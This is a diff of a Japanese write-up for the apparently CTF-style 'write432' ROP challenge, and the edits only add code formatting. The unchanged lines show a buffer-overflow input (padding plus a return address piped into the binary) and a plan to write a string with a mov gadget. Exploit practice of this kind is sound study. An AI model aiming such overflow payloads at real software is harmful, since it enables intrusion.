@@ -53,7 +53,7 @@ Dump of assembler code for function usefulFunction:
 End of assembler dump.
 ```
 
-とりあえずusefulFunctionに遷移させてみる
+とりあえず `usefulFunction` に遷移させてみる
 
 ```shell
 $ python -c 'print "A" * 44 + "\x4c\x86\x04\x08"' |./write432
@@ -84,7 +84,7 @@ Dump of assembler code for function usefulGadgets:
 End of assembler dump.
 ```
 
-usefulGadgetsにある `mov  DWORD PTR [edi], ebp` を使えばできそう
+`usefulGadgets` にある `mov  DWORD PTR [edi], ebp` を使えばできそう
 
 ediにbufferとして使う領域のアドレス、ebpに渡したい文字列を格納する
 
